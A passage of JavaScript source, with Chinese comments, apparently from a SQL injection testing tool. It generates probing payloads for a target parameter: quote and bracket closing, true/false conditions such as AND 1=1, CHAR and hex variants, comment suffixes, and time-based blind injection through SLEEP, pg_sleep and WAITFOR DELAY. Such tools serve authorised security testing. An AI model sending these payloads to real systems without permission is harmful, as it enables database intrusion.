            const currentTestConfig = getTestConfig();
            const currentSelectedSpaceReplacements = currentTestConfig.spaceReplacement;
            
            // 为每个选择的空格替换策略生成测试用例
            currentSelectedSpaceReplacements.forEach(spaceReplacement => {
                // 确保所有测试用例都有明确的blindTechnique值，默认为'无'
                const testCaseCopy = { 
                    ...testCase, 
                    spaceReplacement: spaceReplacement, 
                    blindTechnique: testCase.blindTechnique || '无' 
                };
                
                // 生成唯一标识符，用于去重
                // 基于payload、injectionType、spaceReplacement和commentVariant生成唯一ID
                const uniqueId = `${testCaseCopy.payload}-${testCaseCopy.injectionType}-${spaceReplacement}-${testCaseCopy.commentVariant || 'none'}`;
                
                // 只有当该测试用例没有被添加过时，才添加它
                if (!uniqueTestCases.has(uniqueId)) {
                    uniqueTestCases.add(uniqueId);
                    testCases.push(testCaseCopy);
                }
            });
        }
    }
    

    
    // 基本注入测试
    if (testDepth === 'simple' || testDepth === 'medium' || testDepth === 'advanced') {
        // 注释变体英文到中文的映射
        const commentVariantMap = {
            'no_comment': '不带注释',
            'double_dash': '双横线注释',
            'double_dash_plus': '双横线+注释',
            'hash': '井号注释',
            'multi_line': '多行注释',
            'inline': '内联注释',
            'double_dash_space': '双重注释'
        };
        
        // 获取用户选择的配置
        const selectedVariants = getTestConfig().commentVariants;
        const selectedBlindTechniques = getTestConfig().blindInjectionTechniques;
        const selectedLogicOperators = getTestConfig().logicOperators;
        const selectedWrappers = getTestConfig().fieldWrappers;
        
        // 时间盲注测试用例生成
        if (injectionType === 'time_blind') {
            // 获取盲注延迟时间
            const delay = getTestConfig().blindInjectionDelay;
            
            // 根据用户选择的字段包裹符，只生成对应的字符串注入类型
            const selectedWrappers = testConfig.fieldWrappers;
            const stringInjectionTypes = [];
            
            // 只添加用户选择的字段包裹符对应的字符串注入类型
            if (selectedWrappers.includes('single_quote')) {
                stringInjectionTypes.push('string_single');
            }
            if (selectedWrappers.includes('double_quote')) {
                stringInjectionTypes.push('string_double');
            }
            if (selectedWrappers.includes('single_quote_parentheses') || selectedWrappers.includes('single_quote_square_bracket')) {
                stringInjectionTypes.push('bracket_single');
            }
            if (selectedWrappers.includes('double_quote_parentheses') || selectedWrappers.includes('double_quote_square_bracket')) {
                stringInjectionTypes.push('bracket_double');
            }
            
            // 为每种字符串注入类型生成时间盲注测试用例
            stringInjectionTypes.forEach(stringType => {
                selectedBlindTechniques.forEach(blindTechnique => {
                    // 如果选择了"无"选项，只生成普通测试用例，不生成时间盲注测试用例
                    if (blindTechnique === 'none') return;
                    if (!blindTechnique.includes('time_blind')) return;
                    
                    // 确定使用的时间函数
                    let timeFunction;
                    switch(blindTechnique) {
                        case 'time_blind_pg':
                            timeFunction = `pg_sleep(${delay})`;
                            break;
                        case 'time_blind_mssql':
                            timeFunction = `IF(1=1) WAITFOR DELAY '0:0:${delay}'`;
                            break;
                        case 'time_blind_mysql':
                        default:
                            timeFunction = `SLEEP(${delay})`;
                            break;
                    }
                    
                    selectedVariants.forEach(variant => {
                        const chineseVariant = commentVariantMap[variant] || variant;
                        
                        // 添加注释后缀
                        const commentSuffix = variant !== 'no_comment' ? {
                            'double_dash': ' -- ',
                            'double_dash_plus': ' --+',
                            'hash': ' #',
                            'multi_line': ' /*注释*/',
                            'inline': ' /*!SQL注入测试*/',
                            'double_dash_space': ' -- -'
                        }[variant] || ' -- ' : '';
                        
                        // 确定引号类型
                        let quote = '';
                        let prefix = param.value;
                        let wrapperType;
                        
                        if (stringType === 'string_single') {
                            quote = "'";
                            prefix += quote;
                            wrapperType = '单引号';
                        } else if (stringType === 'string_double') {
                            quote = '"';
                            prefix += quote;
                            wrapperType = '双引号';
                        } else if (stringType === 'bracket_single') {
                            quote = "'";
                            prefix += `)${quote}`;
                            wrapperType = '括号';
                        } else if (stringType === 'bracket_double') {
                            quote = '"';
                            prefix += `)${quote}`;
                            wrapperType = '括号';
                        }
                        
                        // MSSQL使用不同的语法
                        if (blindTechnique === 'time_blind_mssql') {
                            // 只生成一种格式
                            let payload = `${param.value}'; ${timeFunction}${commentSuffix}`;
                            addTestCase({
                                    name: `时间盲注-${blindTechniqueMap[blindTechnique] || blindTechnique}-${chineseVariant}`,
                                    payload: payload,
                                    expected: `时间盲注测试，延迟${delay}秒`,
                                    commentVariant: chineseVariant,
                                    wrapperType: wrapperType,
                                    injectionType: injectionType,
                                    blindTechnique: blindTechnique
                                });
                        } else {
                            // 生成三种不同格式的payload
                            const formats = [
                                `${prefix} AND ${quote}1${quote}=${quote}1 AND ${timeFunction}${commentSuffix}`,
                                `${prefix} AND ${quote}1${quote}=${quote}1${quote} AND ${timeFunction}${commentSuffix}`,
                                `${prefix} AND 1=1 AND ${timeFunction}${commentSuffix}`
                            ];
                            
                            formats.forEach((format, index) => {
                                addTestCase({
                                        name: `时间盲注-${blindTechniqueMap[blindTechnique] || blindTechnique}-格式${index + 1}-${chineseVariant}`,
                                        payload: format,
                                        expected: `时间盲注测试，格式${index + 1}，延迟${delay}秒`,
                                        commentVariant: chineseVariant,
                                        wrapperType: wrapperType,
                                        injectionType: injectionType,
                                        blindTechnique: blindTechnique
                                    });
                            });
                        }
                    });
                });
            });
            
            // 时间盲注测试用例生成完成后，返回测试用例
            return testCases;
        }
        
        // 检查是否只选择了时间盲注技术，没有选择"无"选项
        const hasNoneOption = selectedBlindTechniques.includes('none');
        const hasTimeBlindTechnique = selectedBlindTechniques.some(tech => tech.includes('time_blind'));
        
        // 如果只选择了时间盲注技术，没有选择"无"选项，则跳过生成普通测试用例
        // 如果同时选择了"无"选项和时间盲注技术，则生成普通测试用例
        if (hasTimeBlindTechnique && !hasNoneOption && injectionType !== 'time_blind') {
            // 如果选择了时间盲注技术但没有选择"无"选项，并且当前注入类型不是time_blind，
            // 则跳过生成普通测试用例，避免生成不必要的AND 1=1测试用例
            return testCases;
        }
        
        // 生成方括号测试用例（只在选择了方括号作为字段包裹符时生成）
        if (selectedWrappers.includes('square_bracket')) {
            // 为每个选择的注释变体生成方括号测试
            selectedVariants.forEach(variant => {
                const chineseVariant = commentVariantMap[variant] || variant;
                
                // 添加注释后缀
                const commentSuffix = variant !== 'no_comment' ? {
                    'double_dash': ' -- ',
                    'double_dash_plus': ' --+',
                    'hash': ' #',
                    'multi_line': ' /*注释*/',
                    'inline': ' /*!SQL注入测试*/',
                    'double_dash_space': ' -- -'
                }[variant] || ' -- ' : '';
                
                // 只有当逻辑运算符为'none'时，才生成简单的方括号闭合测试用例
                if (selectedLogicOperators.includes('none')) {
                    // 类型1: 仅方括号后缀
                    let payload1 = `${param.value}]${commentSuffix}`;
                    addTestCase({
                        name: `方括号后缀测试-${chineseVariant}`,
                        payload: payload1,
                        expected: `方括号后缀测试`,
                        commentVariant: chineseVariant,
                        wrapperType: '方括号',
                        injectionType: injectionType
                    });
                    
                    // 类型2: 单引号+方括号后缀
                    let payload2 = `${param.value}']${commentSuffix}`;
                    addTestCase({
                        name: `单引号+方括号后缀测试-${chineseVariant}`,
                        payload: payload2,
                        expected: `单引号+方括号后缀测试`,
                        commentVariant: chineseVariant,
                        wrapperType: '方括号',
                        injectionType: injectionType
                    });
                }
            });
        }
        
        // 生成引号闭合测试用例（只生成一次）
        if (injectionType.includes('string') || injectionType.includes('bracket')) {
            // 检查用户是否选择了对应的包裹符
            const wrapperType = injectionType.includes('single') ? '单引号' : injectionType.includes('double') ? '双引号' : '括号';
            
            // 只有当用户选择了对应的包裹符，并且选择了'none'作为逻辑运算符时，才生成简单的引号闭合测试用例
            if (selectedWrappers.includes(wrapperType === '单引号' ? 'single_quote' : wrapperType === '双引号' ? 'double_quote' : '') && selectedLogicOperators.includes('none')) {
                addTestCase({
                    name: '引号闭合测试',
                    payload: getQuotePayload(injectionType, param.value),
                    expected: '应返回SQL语法错误',
                    commentVariant: '不带注释',
                    wrapperType: wrapperType,
                    injectionType: injectionType
                });
            }
        }
        
        // 遍历用户选择的所有逻辑运算符
        selectedLogicOperators.forEach(operator => {
            // 获取实际的运算符字符串
            const actualOperator = getActualOperator(operator);
            
            // 为每个选择的注释变体生成测试用例
            selectedVariants.forEach(variant => {
                const chineseVariant = commentVariantMap[variant] || variant;
                
                // 添加注释后缀
                const commentSuffix = variant !== 'no_comment' ? {
                    'double_dash': ' -- ',
                    'double_dash_plus': ' --+',
                    'hash': ' #',
                    'multi_line': ' /*注释*/',
                    'inline': ' /*!SQL注入测试*/',
                    'double_dash_space': ' -- -'
                }[variant] || ' -- ' : '';
                
                // 仅处理字符型注入，数字型注入跳过
                if (injectionType === 'numeric') {
                    return;
                }
                
                // 确定引号类型
                let quote = '';
                if (injectionType === 'string_single' || injectionType === 'bracket_single') {
                    quote = "'";
                } else if (injectionType === 'string_double' || injectionType === 'bracket_double') {
                    quote = '"';
                } else if (injectionType === 'string_backtick' || injectionType === 'backtick') {
                    quote = '`';
                }
                
                // 确定字段包裹符
                const wrapperType = injectionType.includes('single') ? '单引号' : 
                                  injectionType.includes('double') ? '双引号' : 
                                  injectionType === 'string_backtick' || injectionType === 'backtick' ? '反引号' :
                                  injectionType.includes('bracket') ? '括号' : '无';
                
                // 构建基本前缀
                let prefix = param.value;
                if (injectionType.includes('bracket')) {
                    prefix += ')';
                } else {
                    prefix += quote;
                }
                
                // 处理方括号+逻辑运算符的测试用例
                if (selectedWrappers.includes('square_bracket') && operator !== 'none') {
                    // 类型3: 单引号+方括号+AND '1'='1（缺少结束引号）
                    let payload3 = `${param.value}'] ${actualOperator} '1'='1${commentSuffix}`;
                    let falsePayload3 = `${param.value}'] ${actualOperator} '1'='2${commentSuffix}`;
                    addTestCase({
                        name: `方括号+${actualOperator} '1'='1测试-${chineseVariant}`,
                        payload: payload3,
                        falsePayload: falsePayload3,
                        expected: `方括号+${actualOperator} '1'='1条件测试（缺少结束引号）`,
                        commentVariant: chineseVariant,
                        wrapperType: '方括号',
                        injectionType: injectionType
                    });
                    
                    // 类型4: 单引号+方括号+AND '1'='1'（完整引号）
                    let payload4 = `${param.value}'] ${actualOperator} '1'='1'${commentSuffix}`;
                    let falsePayload4 = `${param.value}'] ${actualOperator} '1'='2'${commentSuffix}`;
                    addTestCase({
                        name: `方括号+${actualOperator} '1'='1'测试-${chineseVariant}`,
                        payload: payload4,
                        falsePayload: falsePayload4,
                        expected: `方括号+${actualOperator} '1'='1'条件测试`,
                        commentVariant: chineseVariant,
                        wrapperType: '方括号',
                        injectionType: injectionType
                    });
                    
                    // 类型5: 单引号+方括号+AND 1=1
                    let payload5 = `${param.value}'] ${actualOperator} 1=1${commentSuffix}`;
                    let falsePayload5 = `${param.value}'] ${actualOperator} 1=2${commentSuffix}`;
                    addTestCase({
                        name: `方括号+${actualOperator} 1=1测试-${chineseVariant}`,
                        payload: payload5,
                        falsePayload: falsePayload5,
                        expected: `方括号+${actualOperator} 1=1条件测试`,
                        commentVariant: chineseVariant,
                        wrapperType: '方括号',
                        injectionType: injectionType
                    });
                }
                
                // 如果逻辑运算符是'none'，只生成简单的闭合测试
                if (operator === 'none') {
                    // 检查是否选择了组合包裹符（如单引号+双引号）
                    const hasCombinedWrapper = selectedWrappers.some(wrapper => 
                        wrapper.includes('_') && !wrapper.includes('parentheses')
                    );
                    
                    // 如果选择了组合包裹符，则不生成简单闭合测试
                    if (!hasCombinedWrapper) {
                        let payload = `${prefix}${commentSuffix}`;
                        addTestCase({
                            name: `简单闭合测试-${chineseVariant}`,
                            payload: payload,
                            expected: `简单闭合测试，无逻辑运算符`,
                            commentVariant: chineseVariant,
                            wrapperType: wrapperType,
                            injectionType: injectionType,
                            logicOperator: 'none'
                        });
                    }
                } else {
                    // 类型1: AND 1=1
                    let payload1 = `${prefix} ${actualOperator} 1=1${commentSuffix}`;
                    let falsePayload1 = `${prefix} ${actualOperator} 1=2${commentSuffix}`;
                    
                    addTestCase({
                        name: `${actualOperator} 1=1测试-${chineseVariant}`,
                        payload: payload1,
                        falsePayload: falsePayload1,
                        expected: `${actualOperator} 1=1条件测试`,
                        commentVariant: chineseVariant,
                        wrapperType: wrapperType,
                        injectionType: injectionType,
                        logicOperator: operator
                    });
                    
                    // 类型2: AND '1'='1' (根据引号类型调整)
                    let payload2 = `${prefix} ${actualOperator} ${quote}1${quote}=${quote}1${quote}${commentSuffix}`;
                    let falsePayload2 = `${prefix} ${actualOperator} ${quote}1${quote}=${quote}2${quote}${commentSuffix}`;
                    
                    addTestCase({
                        name: `${actualOperator} ${quote}1${quote}=${quote}1${quote}测试-${chineseVariant}`,
                        payload: payload2,
                        falsePayload: falsePayload2,
                        expected: `${actualOperator} ${quote}1${quote}=${quote}1${quote}条件测试`,
                        commentVariant: chineseVariant,
                        wrapperType: wrapperType,
                        injectionType: injectionType
                    });
                    
                    // 类型3: AND '1'='1 (根据引号类型调整，缺少结束引号)
                    let payload3 = `${prefix} ${actualOperator} ${quote}1${quote}=${quote}1${commentSuffix}`;
                    let falsePayload3 = `${prefix} ${actualOperator} ${quote}1${quote}=${quote}2${commentSuffix}`;
                    
                    addTestCase({
                        name: `${actualOperator} ${quote}1${quote}=${quote}1测试-${chineseVariant}`,
                        payload: payload3,
                        falsePayload: falsePayload3,
                        expected: `${actualOperator} ${quote}1${quote}=${quote}1条件测试（缺少结束引号）`,
                        commentVariant: chineseVariant,
                        wrapperType: wrapperType,
                        injectionType: injectionType
                    });
                }
            });
        });
        
        // 生成CHAR函数测试用例
        if (selectedWrappers.includes('char_function')) {
            // 获取用户选择的所有逻辑运算符
            const allLogicOperators = getTestConfig().logicOperators;
            
            // 为每个逻辑运算符生成CHAR函数测试用例
            allLogicOperators.forEach(operatorKey => {
                // 逻辑运算符为'无'时，不生成CHAR函数测试用例
                if (operatorKey === 'none') {
                    return;
                }
                
                const actualOperator = getActualOperator(operatorKey);
                
                // 为每个注释变体生成测试用例
                selectedVariants.forEach(variant => {
                    const chineseVariant = commentVariantMap[variant] || variant;
                    
                    // 添加注释后缀
                    const commentSuffix = variant !== 'no_comment' ? {
                        'double_dash': ' -- ',
                        'double_dash_plus': ' --+',
                        'hash': ' #',
                        'multi_line': ' /*注释*/',
                        'inline': ' /*!SQL注入测试*/',
                        'double_dash_space': ' -- -'
                    }[variant] || ' -- ' : '';
                    
                    // 仅处理字符型注入，数字型注入跳过
                    if (injectionType === 'numeric') {
                        return;
                    }
                    
                    // 确定引号类型
                    let quote = '';
                    if (injectionType === 'string_single' || injectionType === 'bracket_single') {
                        quote = "'";
                    } else if (injectionType === 'string_double' || injectionType === 'bracket_double') {
                        quote = '"';
                    } else if (injectionType === 'string_backtick' || injectionType === 'backtick') {
                        quote = '`';
                    }
                    
                    // 构建基本前缀
                    let prefix = param.value;
                    if (injectionType.includes('bracket')) {
                        prefix += ')';
                    } else {
                        prefix += quote;
                    }
                    
                    // 正常逻辑运算符时，生成标准格式的payload
                    let payloadCharTrue = `${prefix} ${actualOperator} CHAR(49)=CHAR(49)${commentSuffix}`;
                    let payloadCharFalse = `${prefix} ${actualOperator} CHAR(49)=CHAR(50)${commentSuffix}`;
                    
                    addTestCase({
                        name: `${actualOperator} CHAR函数测试-${chineseVariant}`,
                        payload: payloadCharTrue,
                        falsePayload: payloadCharFalse,
                        expected: `${actualOperator} CHAR函数条件测试`,
                        commentVariant: chineseVariant,
                        wrapperType: 'CHAR函数',
                        injectionType: injectionType
                    });
                });
            });
        }
        
        // 生成十六进制测试用例
        if (selectedWrappers.includes('hex')) {
            // 获取用户选择的所有逻辑运算符
            const allLogicOperators = getTestConfig().logicOperators;
            
            // 为每个逻辑运算符生成十六进制测试用例
            allLogicOperators.forEach(operatorKey => {
                // 逻辑运算符为'无'时，不生成十六进制测试用例
                if (operatorKey === 'none') {
                    return;
                }
                
                const actualOperator = getActualOperator(operatorKey);
                
                // 为每个注释变体生成测试用例
                selectedVariants.forEach(variant => {
                    const chineseVariant = commentVariantMap[variant] || variant;
                    
                    // 添加注释后缀
                    const commentSuffix = variant !== 'no_comment' ? {
                        'double_dash': ' -- ',
                        'double_dash_plus': ' --+',
                        'hash': ' #',
                        'multi_line': ' /*注释*/',
                        'inline': ' /*!SQL注入测试*/',
                        'double_dash_space': ' -- -'
                    }[variant] || ' -- ' : '';
                    
                    // 仅处理字符型注入，数字型注入跳过
                    if (injectionType === 'numeric') {
                        return;
                    }
                    
                    // 确定引号类型
                    let quote = '';
                    if (injectionType === 'string_single' || injectionType === 'bracket_single') {
                        quote = "'";
                    } else if (injectionType === 'string_double' || injectionType === 'bracket_double') {
                        quote = '"';
                    } else if (injectionType === 'string_backtick' || injectionType === 'backtick') {
                        quote = '`';
                    }
                    
                    // 构建基本前缀
                    let prefix = param.value;
                    if (injectionType.includes('bracket')) {
                        prefix += ')';
                    } else {
                        prefix += quote;
                    }
                    
                    // 正常逻辑运算符时，生成标准格式的payload
                    let payloadHexTrue = `${prefix} ${actualOperator} (0x31)=(0x31)${commentSuffix}`;
                    let payloadHexFalse = `${prefix} ${actualOperator} (0x31)=(0x32)${commentSuffix}`;
                    
                    addTestCase({
                        name: `${actualOperator} 十六进制测试-${chineseVariant}`,
                        payload: payloadHexTrue,
                        falsePayload: payloadHexFalse,
                        expected: `${actualOperator} 十六进制条件测试`,
                        commentVariant: chineseVariant,
                        wrapperType: '十六进制',
                        injectionType: injectionType
                    });
                });
            });
        }
    }
    
    // 只在medium或advanced测试深度添加高级测试用例 - 已简化，仅保留基本测试
    if (testDepth === 'medium' || testDepth === 'advanced') {
        // 禁用高级测试用例，仅保留基本的三种注入测试
    }
    
    // 高级测试用例生成 - 已禁用，仅保留基本的三种注入测试
    if (testDepth === 'medium' || testDepth === 'advanced') {
        // 禁用高级测试用例，仅保留基本的三种注入测试
    }
    
    // 高级深度测试 - 已禁用
    if (testDepth === 'advanced') {
        // 禁用高级深度测试，仅保留基本的三种注入测试
    }

    // 当选择了"无"选项时，总是生成字段包裹符测试用例
    // 当没有选择"无"选项但选择了时间盲注技术时，不生成字段包裹符测试用例
    const hasNoneOption = selectedBlindTechniques.includes('none');
    const hasTimeBlindTechnique = selectedBlindTechniques.some(tech => tech.includes('time_blind'));
    
    // 生成字段包裹符测试用例，移除注入类型限制
    // 允许为所有注入类型生成字段包裹符测试用例，确保所有选中的包裹符都能被测试
    if (hasNoneOption || !hasTimeBlindTechnique) {
        // 生成字段包裹符测试用例
        const fieldWrapperTestCases = getFieldWrappersPayload(injectionType, param.value);
        fieldWrapperTestCases.forEach(testCase => {
            // 为每个字段包裹符测试用例添加injectionType属性
            testCase.injectionType = injectionType;
            // 使用addTestCase函数添加测试用例，确保应用空格替换策略和其他必要处理
            addTestCase(testCase);
        });
    }

    return testCases;
}

// 生成带注释变体的恒真条件payload
function getTruePayloadWithComment(injectionType, originalValue, commentVariant, operator) {
    // 基础payload（不带注释）
    let basePayload;
    if (operator === 'none') {
        // 无逻辑运算符时，只生成闭合引号或括号，不添加1=1条件
        switch(injectionType) {
            case 'string_single':
                basePayload = `${originalValue}'`;
                break;
            case 'string_double':
                basePayload = `${originalValue}"`;
                break;
            case 'string_backtick':
                basePayload = `${originalValue}\``;
                break;
            case 'bracket_single':
                basePayload = `${originalValue}')`;
                break;
            case 'bracket_double':
                basePayload = `${originalValue}")`;
                break;
            default:
                basePayload = `${originalValue}`;
        }
    } else {
        // 正常生成带逻辑运算符的恒真条件
        basePayload = getBaseTruePayload(injectionType, originalValue, operator);
    }
    
    // 根据注释变体添加不同的注释
    switch(commentVariant) {
        case 'no_comment':
            return basePayload;
        case 'double_dash':
            return `${basePayload} -- `;
        case 'double_dash_plus':
            return `${basePayload} --+`;
        case 'hash':
            return `${basePayload} #`;
        case 'multi_line':
            return `${basePayload} /*注释*/`;
        case 'inline':
            return `${basePayload} /*!SQL注入测试*/`;
        case 'double_dash_space':
            return `${basePayload} -- -`;
        default:
            return `${basePayload} -- `;
    }
}

// 生成带注释变体的恒假条件payload
function getFalsePayloadWithComment(injectionType, originalValue, commentVariant, operator) {
    // 基础payload（不带注释）
    let basePayload;
    
    if (operator === 'none') {
        // 无逻辑运算符时，1=1和1=2测试使用相同的简单闭合payload
        switch(injectionType) {
            case 'string_single':
                basePayload = `${originalValue}'`;
                break;
            case 'string_double':
                basePayload = `${originalValue}"`;
                break;
            case 'string_backtick':
                basePayload = `${originalValue}\``;
                break;
            case 'bracket_single':
                basePayload = `${originalValue}')`;
                break;
            case 'bracket_double':
                basePayload = `${originalValue}")`;
                break;
            default:
                basePayload = `${originalValue}`;
        }
    } else {
        // 根据逻辑运算符生成对应的恒假条件
        const logicOperator = getActualOperator(operator);
        
        switch(injectionType) {
            case 'string_single':
                basePayload = `${originalValue}' ${logicOperator} '1'='2'`;
                break;
            case 'string_double':
                basePayload = `${originalValue}" ${logicOperator} "1"="2"`;
                break;
            case 'string_backtick':
                basePayload = `${originalValue}\` ${logicOperator} \`1\`=\`2\``;
                break;
            case 'bracket_single':
                basePayload = `${originalValue}') ${logicOperator} 1=2`;
                break;
            case 'bracket_double':
                basePayload = `${originalValue}") ${logicOperator} 1=2`;
                break;
            default:
                basePayload = `${originalValue} ${logicOperator} 1=2`;
                break;
        }
    }
    
    // 根据注释变体添加不同的注释
    switch(commentVariant) {
        case 'no_comment':
            return basePayload;
        case 'double_dash':
            return `${basePayload} -- `;
        case 'double_dash_plus':
            return `${basePayload} --+`;
        case 'hash':
            return `${basePayload} #`;
        case 'multi_line':
            return `${basePayload} /*注释*/`;
        case 'inline':
            return `${basePayload} /*!SQL注入测试*/`;
        case 'double_dash_space':
            return `${basePayload} -- -`;
        default:
            return `${basePayload} -- `;
    }
}

// 逻辑运算符内部表示到实际符号的映射
function getActualOperator(operator) {
    const operatorMap = {
        'none': '',
        'and': 'AND',
        'or': 'OR',
        'and_double_ampersand': '&&',
        'or_double_pipe': '||',
        'not_equal': '<>',
        'like': 'LIKE',
        'in': 'IN',
        'regexp': 'REGEXP'
    };
    return operatorMap[operator] || operator || 'AND';
}

// 生成恒真条件payload（保持向后兼容）
function getTruePayload(injectionType, originalValue, operator = null) {
    return getTruePayloadWithComment(injectionType, originalValue, 'double_dash', operator);
}

// 生成恒假条件payload（保持向后兼容）
function getFalsePayload(injectionType, originalValue, operator = null) {
    return getFalsePayloadWithComment(injectionType, originalValue, 'double_dash', operator);
}

// 生成引号测试payload
function getQuotePayload(injectionType, originalValue) {
    switch(injectionType) {
        case 'string_single':
            return `${originalValue}'`;
        case 'string_double':
            return `${originalValue}"`;
        case 'string_backtick':
            return `${originalValue}\``;
        case 'bracket_single':
            return `${originalValue}')`;
        case 'bracket_double':
            return `${originalValue}")`;
        default:
            return `${originalValue}'`;
    }
}

// 生成注释变体payload
function getCommentVariantsPayload(injectionType, originalValue) {
    const commentVariants = [];
    
    // 基础恒真条件（不带注释）
    const baseTruePayload = getBaseTruePayload(injectionType, originalValue);
    
    // 获取用户选择的注释变体
    const selectedVariants = getTestConfig().commentVariants;
    
    // 1. 不带注释
    if (selectedVariants.includes('no_comment')) {
        commentVariants.push({
            name: '注释变体-不带注释',
            payload: `${baseTruePayload}`
        });
    }
    
    // 2. 双横线注释
    if (selectedVariants.includes('double_dash')) {
        commentVariants.push({
            name: '注释变体-双横线',
            payload: `${baseTruePayload} -- `
        });
    }
    
    // 3. 双横线+注释
    if (selectedVariants.includes('double_dash_plus')) {
        commentVariants.push({
            name: '注释变体-双横线+',
            payload: `${baseTruePayload} --+`
        });
    }
    
    // 4. 井号注释
    if (selectedVariants.includes('hash')) {
        commentVariants.push({
            name: '注释变体-井号',
            payload: `${baseTruePayload} #`
        });
    }
    
    // 5. 多行注释
    if (selectedVariants.includes('multi_line')) {
        commentVariants.push({
            name: '注释变体-多行注释',
            payload: `${baseTruePayload} /*注释*/`
        });
    }
    
    // 6. 内联注释（MySQL特定）
    if (selectedVariants.includes('inline')) {
        commentVariants.push({
            name: '注释变体-内联注释',
            payload: `${baseTruePayload} /*!SQL注入测试*/`
        });
    }
    
    // 7. 双重注释（双横线+空格）
    if (selectedVariants.includes('double_dash_space')) {
        commentVariants.push({
            name: '注释变体-双重注释',
            payload: `${baseTruePayload} -- -`
        });
    }
    
    return commentVariants;
}

// 生成基础恒真条件（不带注释）
function getBaseTruePayload(injectionType, originalValue, operator = null) {
    // 如果没有传入operator，获取用户选择的第一个逻辑运算符
    let selectedOperator;
    if (operator) {
        selectedOperator = operator;
    } else {
        const selectedLogicOperators = getTestConfig().logicOperators;
        // 如果用户没有选择逻辑运算符，默认使用and
        selectedOperator = selectedLogicOperators.length > 0 ? selectedLogicOperators[0] : 'and';
    }
    
    // 根据逻辑运算符生成对应的恒真条件
    const logicOperator = getActualOperator(selectedOperator);
    
    // 处理无逻辑运算符的情况
    if (selectedOperator === 'none' || logicOperator === '') {
        switch(injectionType) {
            case 'string_single':
                return `${originalValue}'`;
            case 'string_double':
                return `${originalValue}"`;
            case 'string_backtick':
                return `${originalValue}\``;
            case 'bracket_single':
                return `${originalValue}')`;
            case 'bracket_double':
                return `${originalValue}")`;
            default:
                return `${originalValue}`;
        }
    }
    
    // 正常生成带逻辑运算符的恒真条件
    switch(injectionType) {
        case 'string_single':
            return `${originalValue}' ${logicOperator} '1'='1'`;
        case 'string_double':
            return `${originalValue}" ${logicOperator} "1"="1"`;
        case 'string_backtick':
            return `${originalValue}\` ${logicOperator} \`1\`=\`1\``;
        case 'bracket_single':
            return `${originalValue}') ${logicOperator} 1=1`;
        case 'bracket_double':
            return `${originalValue}") ${logicOperator} 1=1`;
        default:
            return `${originalValue} ${logicOperator} 1=1`;
    }
}

// 生成字段包裹符payload - 优化后：不再生成大量重复的AND 1=1测试用例
function getFieldWrappersPayload(injectionType, originalValue) {
    const fieldWrappers = [];
    
    // 获取用户选择的配置
    const testConfig = getTestConfig();
    const selectedWrappers = testConfig.fieldWrappers;
    const selectedVariants = testConfig.commentVariants;
    
    // 检查用户是否选择了'none'作为逻辑运算符
    const hasNoneOperator = testConfig.logicOperators.includes('none');
    
    // 确定使用的逻辑运算符
    let selectedOperator;
    let actualOperator;
    
    if (hasNoneOperator) {
        // 如果选择了'none'，则生成直接闭合括号的测试用例
        selectedOperator = 'none';
        actualOperator = '';
    } else {
        // 检查是否有可用的逻辑运算符
        const hasValidOperators = testConfig.logicOperators.length > 0;
        if (!hasValidOperators) {
            return fieldWrappers;
        }
        
        // 否则使用第一个可用的逻辑运算符
        selectedOperator = testConfig.logicOperators[0];
        actualOperator = getActualOperator(selectedOperator);
    }
    
    // 移除注入类型限制，确保所有字段包裹符测试用例都能被生成
    // 注释掉原有限制，允许为所有注入类型生成字段包裹符测试用例
    // if (injectionType.includes('string') || injectionType.includes('bracket')) {
    //     return fieldWrappers;
    // }
    
    // 辅助函数：生成带注释的测试用例
    function addWrappedTestCases(baseTestCases) {
        // 为每个基础测试用例生成多个注释变体
        baseTestCases.forEach(baseTest => {
            // 为每个选择的注释变体生成测试用例
            selectedVariants.forEach(variant => {
                // 计算注释后缀
                const commentSuffix = variant !== 'no_comment' ? {
                    'double_dash': ' -- ',
                    'double_dash_plus': ' --+',
                    'hash': ' #',
                    'multi_line': ' /*注释*/',
                    'inline': ' /*!SQL注入测试*/',
                    'double_dash_space': ' -- -'
                }[variant] || ' -- ' : '';
                
                // 生成带注释的payload
                let payloadWithComment;
                if (hasNoneOperator) {
                    // 无逻辑运算符时，直接在末尾添加注释
                    payloadWithComment = `${baseTest.payload}${commentSuffix}`;
                } else {
                    // 有逻辑运算符时，替换掉原有的硬编码注释
                    const payloadWithoutComment = baseTest.payload.replace(/\s--\s*$/, '');
                    payloadWithComment = `${payloadWithoutComment}${commentSuffix}`;
                }
                
                // 克隆并修改测试用例
                const testWithComment = {
                    ...baseTest,
                    payload: payloadWithComment,
                    commentVariant: variant
                };
                
                fieldWrappers.push(testWithComment);
            });
        });
    }
    
    // 生成基础测试用例（不带注释）
    const baseTestCases = [];
    
    // 为所有选中的字段包裹符生成测试用例，不再根据注入类型进行限制
    // 当逻辑运算符为'none'时，生成简单的字段包裹符测试用例
    if (hasNoneOperator) {
        // 生成简单的字段包裹符测试用例
        if (selectedWrappers.includes('none')) {
            baseTestCases.push({
                name: '字段包裹符-无',
                payload: `${originalValue}`,
                expected: `字段包裹符-无测试`,
                wrapperType: '无'
            });
        }
        if (selectedWrappers.includes('parentheses')) {
            baseTestCases.push({
                name: '字段包裹符-小括号',
                payload: `${originalValue})`,
                expected: `字段包裹符-小括号测试`,
                wrapperType: '小括号'
            });
        }
        if (selectedWrappers.includes('parentheses_parentheses')) {
            baseTestCases.push({
                name: '字段包裹符-小括号+小括号',
                payload: `${originalValue}))`,
                expected: `字段包裹符-小括号+小括号测试`,
                wrapperType: '小括号+小括号'
            });
        }
        if (selectedWrappers.includes('single_quote_double_quote')) {
            baseTestCases.push({
                name: '字段包裹符-单引号+双引号',
                payload: `${originalValue}'"`,
                expected: `字段包裹符-单引号+双引号测试`,
                wrapperType: '单引号+双引号'
            });
        }
        if (selectedWrappers.includes('double_quote_single_quote')) {
            baseTestCases.push({
                name: '字段包裹符-双引号+单引号',
                payload: `${originalValue}"'`,
                expected: `字段包裹符-双引号+单引号测试`,
                wrapperType: '双引号+单引号'
            });
        }
        if (selectedWrappers.includes('single_quote_parentheses')) {
            baseTestCases.push({
                name: '字段包裹符-单引号+小括号',
                payload: `${originalValue}')`,
                expected: `字段包裹符-单引号+小括号测试`,
                wrapperType: '单引号+小括号'
            });
        }
        if (selectedWrappers.includes('single_quote_parentheses_parentheses')) {
            baseTestCases.push({
                name: '字段包裹符-单引号+小括号+小括号',
                payload: `${originalValue}'))`,
                expected: `字段包裹符-单引号+小括号+小括号测试`,
                wrapperType: '单引号+小括号+小括号'
            });
        }
        if (selectedWrappers.includes('double_quote_parentheses')) {
            baseTestCases.push({
                name: '字段包裹符-双引号+小括号',
